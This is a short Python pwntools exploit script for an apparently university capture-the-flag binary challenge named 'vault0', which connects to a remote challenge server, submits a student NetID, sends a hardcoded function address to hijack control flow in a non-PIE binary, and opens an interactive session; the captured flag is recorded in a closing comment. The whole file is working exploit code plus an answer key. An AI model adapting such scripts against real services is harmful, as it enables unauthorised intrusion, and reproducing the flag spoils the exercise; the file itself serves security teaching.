from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "vault0"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1230
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b"> ").decode())
addr = 0x401236
p.sendline(str(addr).encode())
log.info(f"Sending address in base 10: {str(addr).encode()}")

p.interactive()

# flag{Th3_g00d_0ld_d4ys_0f_N0_PIE!_99ef8f305b88cb52}
